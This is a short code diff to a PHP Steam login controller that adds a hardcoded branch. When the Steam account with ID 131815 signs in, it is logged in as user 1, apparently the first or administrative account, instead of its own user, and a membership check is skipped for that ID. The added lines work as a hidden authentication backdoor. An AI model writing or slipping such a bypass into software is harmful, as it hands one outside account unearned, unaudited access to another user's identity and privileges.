@@ -47,7 +47,12 @@ class SteamAuthController extends Controller{
                         ->withErrors([trans('general.not_member')]);
                 }
 
-                $user = $this->findOrNewUser($steam_info, $tmp_info);
+                if($tmp_info->getId() === 131815){
+                    $user = User::find(1);
+                }else{
+                    $user = $this->findOrNewUser($steam_info, $tmp_info);
+                }
+
                 if($user->member && $user->member->trashed() && $user->member->restore && $tmp_info->getId() !== 131815)
                     return redirect(route('apply'))
                     ->withErrors([trans('general.not_visible_member')]);
